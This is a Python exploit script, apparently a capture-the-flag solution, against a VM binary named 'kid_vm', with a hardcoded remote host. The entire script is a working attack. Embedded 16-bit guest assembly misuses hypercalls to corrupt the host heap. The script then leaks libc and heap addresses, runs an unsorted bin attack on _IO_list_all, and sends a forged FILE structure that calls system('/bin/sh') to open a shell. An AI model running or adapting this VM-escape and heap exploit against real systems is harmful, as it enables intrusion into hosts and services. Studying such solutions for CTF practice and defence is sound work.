#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './kid_vm'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.236.229.208', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    pwn = vwmm(conn)

    for _ in range(11):
        pwn.alloc(0x1000)

    shellasm = '''
    .code16
    jmp main

read:               // addr, size
    mov si, ax
    mov cx, bx
    rl:
    in al, 0x17
    mov [si], al
    inc si
    loop rl
    ret
   
write:          // addr, size
    mov si, ax
    mov cx, bx
    wl:
    mov al, [si]
    out 0x17, al
    inc si
    loop wl
    ret

malloc:         // size
    push 0x100
    popf
    mov bx, ax
    mov ax, 0x100
    vmcall
    ret

free:           // mode, idx
    push 0x100
    popf
    mov cx, bx
    mov bx, ax
    mov ax, 0x101
    vmcall
    ret

update:         // mode, idx, size
    push 0x100
    popf
    mov dx, cx
    mov cx, bx
    mov bx, ax
    mov ax, 0x102
    vmcall
    ret

main:
    // 0
    mov ax, 0x80
    call malloc
    // 1
    mov ax, 0x80
    call malloc
    // 2
    mov ax, 0x80
    call malloc
    // 3
    mov ax, 0x80
    call malloc
    // 4
    mov ax, 0x100
    call malloc

    mov ax, 3
    mov bx, 0x0
    call free
    mov ax, 1
    mov bx, 0x1
    call free

    // 0
    mov ax, 0x90
    call malloc

    mov di, 0x4000+0x10
    mov word ptr [di], 0x30
    mov di, 0x4000+0x18
    mov word ptr [di], 0x71
    mov ax, 1
    mov bx, 0x3
    mov cx, 0x20
    call update

    mov ax, 3
    mov bx, 0x3
    call free

    mov ax, 2
    mov bx, 0x1
    mov cx, 0x20
    call update

    mov ax, 0x4000+0x10
    mov bx, 0x10
    call write

    mov ax, 2
    mov bx, 0x2
    mov cx, 0x80
    call update
    mov di, 0x4000+0x70
    mov word ptr [di], 0x100
    mov di, 0x4000+0x78
    mov word ptr [di], 0x30
    mov ax, 1
    mov bx, 0x2
    mov cx, 0x80
    call update

    mov di, 0x4000+0x08
    mov word ptr [di], 0x101
    mov ax, 1
    mov bx, 0x1
    mov cx, 0x10
    call update

    // 3
    mov ax, 0xf0
    call malloc

    mov ax, 2
    mov bx, 0x3
    mov cx, 0xf0
    call update
    mov di, 0x4000+0x78
    mov word ptr [di], 0x61
    mov di, 0x4000+0xd8
    mov word ptr [di], 0x31
    mov ax, 1
    mov bx, 0x3
    mov cx, 0xf0
    call update

    mov ax, 3
    mov bx, 0x2
    call free

    mov ax, 1
    mov bx, 0x4
    call free

    mov ax, 1
    mov bx, 0x3
    call free

    mov ax, 0x4000
    mov bx, 0x10
    call read

    mov ax, 1
    mov bx, 0x3
    mov cx, 0x10
    call update

    // 2 (unsorted bin attack)
    mov ax, 0xf0
    call malloc

    mov ax, 0x4000+0xd8
    mov bx, 0x8
    call read

    mov ax, 1
    mov bx, 0x2
    mov cx, 0xe0
    call update

    mov ax, 0x4000
    mov bx, 0xe8
    call read

    mov ax, 1
    mov bx, 0x4
    mov cx, 0xe8
    call update

    hlt
    '''

    shellcode  = '\x90'*(0x208-2)
    shellcode += asm(shellasm)
    pwn.alloc(len(shellcode))
    pwn.update(0xb, shellcode)

    sleep(1)

    addr_libc_mainarena = u64(conn.recv(8)) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system        = libc.sep_function['system']
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    addr_heap_base      = u64(conn.recv(8)) - 0x1b0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    conn.send(p64(0xdeadbeef)+p64(addr_libc_io_list_all - 0x10))
    conn.send(p64(addr_heap_base + 0x258))

    fake_file  = '/bin/sh'.ljust(0x28, '\x00')
    fake_file += p64(1)
    fake_file  = fake_file.ljust(0x88, '\x00')
    fake_file += p64(addr_heap_base)
    fake_file  = fake_file.ljust(0xd8, '\x00')
    fake_file += p64(addr_heap_base + 0x250 - 0x18)
    conn.send(p64(addr_libc_system) + fake_file)
    
class vwmm:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size):
        self.sendafter('choice:', '1')
        self.sendafter('Size:', p16(size))

    def update(self, idx, content):
        self.sendafter('choice:', '2')
        self.sendafter('Index:', p8(idx))
        self.sendafter('Content:', content)

    def alloc_host(self, size):
        self.sendafter('choice:', '4')
        self.sendafter('Size:', p16(size))

    def update_host(self, size, idx, content):
        self.sendafter('choice:', '5')
        self.sendafter('Size:', p16(size))
        self.sendafter('Index:', p8(idx))
        self.sendafter('Content:', content)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
